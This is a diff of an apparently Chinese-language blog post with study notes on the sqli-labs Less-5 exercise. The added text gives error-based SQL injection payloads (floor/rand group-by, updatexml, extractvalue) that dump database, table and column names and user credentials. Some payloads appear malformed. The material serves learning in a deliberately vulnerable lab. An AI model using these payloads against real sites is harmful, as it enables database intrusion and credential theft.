@@ -97,7 +97,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">485</span>
+            <span class="post-count">1.1k</span>
         </span>
     </span>
 
@@ -106,7 +106,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">2 min</span>
+            <span class="post-count">4 min</span>
         </span>
     </span>
 </div>
@@ -134,15 +134,42 @@
 
 <img src="../../source/images/Less-5/image-20211013133250117.png" alt="image-20211013133250117" style="zoom:33%;" />
 
-<p>方法一：（？）</p>
+<p>方法一：利用floor报错注入一次性爆破数据</p>
+<p><strong>爆库</strong>：</p>
+<pre><code>?id=-1&#39; union select 1,count(*),concat((database()),floor(rand()*2))x from information_schema.tables group by x--+
+</code></pre>
+<p>第一次点击无报错：</p>
+<img src="../../source/images/Less-5/image-20211019151934512.png" alt="image-20211019151934512" style="zoom:33%;" />
+
+<p>再点击一次爆出库名：</p>
+<img src="../../source/images/Less-5/image-20211019144039404.png" alt="image-20211019144039404" style="zoom:33%;" />
+
+<p>less-5的题目为Double Injection（双查询注入/二次查询注入）</p>
+<p>双查询注入其实就是一个select语句中再嵌套一个select语句，嵌套的这个语句称作子查询，例如：</p>
+<pre><code>select concat((select database()));
+</code></pre>
+<p>爆表：（疑惑点：limit0，1）</p>
+<pre><code>?id=-1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&#39;security&#39;),floor(rand()*2))x from information_schema.tables group by x --+
+</code></pre>
+<p>该语句将输出字符长度限制为64个字符</p>
+<img src="../../source/images/Less-5/image-20211019152722321.png" alt="image-20211019152722321" style="zoom:33%;" />
+
+<pre><code>?id=-1&#39; union select 1,count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),floor(rand()*2))x from information_schema.tables group by x --+
+</code></pre>
+<img src="../../source/images/Less-5/image-20211019153335333.png" alt="image-20211019153335333" style="zoom:33%;" />
+
+<p>爆字段：</p>
+<pre><code class="group">?id=-1&#39; union select 1,count(*),concat(select group_concat(column_name) from information_schema.columns where table_name=&#39;user&#39; limit 0,1),floor(rand()*2)x from information_schema.columns group by x --+
+</code></pre>
+<p>爆字段数据：</p>
+<p>方法二：一个个字符确定</p>
 <p>使用left()爆基本信息：</p>
 <p>根据前几道题，我们猜测数据库为security：（也可以利用bp爆破）</p>
 <img src="../../source/images/Less-5/image-20211013133823635.png" alt="image-20211013133823635" style="zoom:33%;" />
 
 <img src="../../source/images/Less-5/image-20211013133738477.png" alt="image-20211013133738477" style="zoom:33%;" />
 
-<p>补充知识：</p>
-<p><strong>截取字符串</strong></p>
+<h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><p><strong>截取字符串</strong></p>
 <p>sql注入截取字符串常用函数有三大法宝：mid(),substr(),left()</p>
 <ol>
 <li>mid()函数：MID(column_name,start[,length])</li>
@@ -177,7 +204,19 @@
 </blockquote>
 <p><strong>参考链接：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/p/5504374.htm">http://www.cnblogs.com/lcamry/p/5504374.htm</a></strong></p>
 <p><strong>报错注入</strong></p>
- 
+<p>三种报错注入函数：</p>
+<p>报错注入的概念：</p>
+<p>(1). 通过floor报错 and (select 1 from (select count(*),concat((<br>payload),floor (rand(0)*2))x from information_schema.tables group by</p>
+<p>x)a) 其中payload为你要插入的SQL语句 需要注意的是该语句将输出字符长度限制为64个字符</p>
+<p>(2). 通过updatexml报错 and updatexml(1, payload,1)</p>
+<p>同样该语句对输出的字符长度也做了限制，其最长输出32位,并且该语句对payload的反悔类型也做了限制，只有</p>
+<p>在payload返回的不是xml格式才会生效.</p>
+<p>(3). 通过extractValue报错 and extractvalue(1, payload) 输出字符有长度限制，最长32位。</p>
+<ol>
+<li>floor()是取整函数。</li>
+</ol>
+<p>注入公式（Payload为自己想获取内容的脚本）：<br>and(select 1 from (select count(*),concat(concat(payload),floor(rand(0)<em>2))x from information_schema.tables group by x)y)<br>and(select 1 from (select count(</em>),concat(concat(database(),0x7e),floor(rand(0)<em>2))x from information_schema.tables group by x)y)<br>//暴库<br>and(select 1 from (select count(</em>),concat(concat((select concat(table_name) from information_schema.tables where table_schema=”security” limit 3,1),0x7e),floor(rand(0)<em>2))x from information_schema.tables group by x)y)<br>//查询表<br>and(select 1 from (select count(</em>),concat(concat((select concat(column_name) from information_schema.columns where table_schema=”security” and table_name=”users” limit 1,1),0x7e),floor(rand(0)<em>2))x from information_schema.tables group by x)y)<br>//查询字段<br>and(select 1 from (select count(</em>),concat(concat((select concat(username,0x7e,password,0x7e) from security.users limit 1,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)<br>//查询字段内容</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3> 
       <!-- reward -->
       
       <div id="reword-out">
